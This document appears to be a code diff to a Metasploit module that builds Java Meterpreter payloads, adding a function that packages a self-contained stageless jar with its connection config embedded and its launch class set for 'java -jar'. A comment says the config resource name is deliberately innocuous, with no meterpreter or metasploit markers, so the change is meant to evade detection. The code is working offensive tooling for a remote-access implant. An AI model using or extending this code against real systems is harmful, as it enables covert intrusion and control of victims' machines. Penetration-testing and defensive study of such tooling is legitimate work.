@@ -1,5 +1,7 @@
 # -*- coding: binary -*-
 
+require 'rex/zip'
+require 'zip'
 
 module Msf
 
@@ -14,6 +16,11 @@ module Payload::Java::MeterpreterLoader
   include Msf::Payload::Java
   include Msf::Payload::UUID::Options
   include Msf::Sessions::MeterpreterOptions
+
+  # Resource path the stageless StagelessMain bootstrap reads. Deliberately
+  # innocuous — no meterpreter/metasploit markers in the name.
+  STAGELESS_CONFIG_RESOURCE = 'META-INF/data'.freeze
+  STAGELESS_MAIN_CLASS = 'com.metasploit.meterpreter.StagelessMain'.freeze
 
   def initialize(info = {})
     super(update_info(info,
@@ -35,9 +42,15 @@ module Payload::Java::MeterpreterLoader
   # Override the Payload::Java version so we can load a prebuilt jar to be
   # used as the final stage; calls super to get the intermediate stager.
   #
+  # When opts[:stageless] is set, returns a self-contained jar with the
+  # TLV config embedded as a resource and Main-Class pinned to
+  # StagelessMain — ready to run under `java -jar`.
+  #
   def stage_meterpreter(opts={})
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
     config = generate_config(opts)
+
+    return build_stageless_jar(met, config) if opts[:stageless]
 
     # All of the dependencies to create a jar loader, followed by the length
     # of the jar and the jar itself, then the config
@@ -54,6 +67,24 @@ module Payload::Java::MeterpreterLoader
 
     # Pack all the magic together
     (blocks + [block_count]).pack('A*' * blocks.length + 'N')
+  end
+
+  # Build a self-contained stageless jar: take the prebuilt meterpreter.jar,
+  # rewrite its manifest to point at StagelessMain, and embed the encoded
+  # config as a jar resource that StagelessMain reads at startup.
+  def build_stageless_jar(src_jar, config_bytes)
+    jar = Rex::Zip::Jar.new
+    ::Zip::File.open_buffer(::StringIO.new(src_jar)) do |zip|
+      zip.each do |entry|
+        next if entry.directory?
+        next if entry.name == 'META-INF/MANIFEST.MF'
+        next if entry.name == STAGELESS_CONFIG_RESOURCE
+        jar.add_file(entry.name, entry.get_input_stream.read)
+      end
+    end
+    jar.add_file(STAGELESS_CONFIG_RESOURCE, config_bytes)
+    jar.build_manifest(main_class: STAGELESS_MAIN_CLASS)
+    jar.pack
   end
 
   def generate_config(opts={})
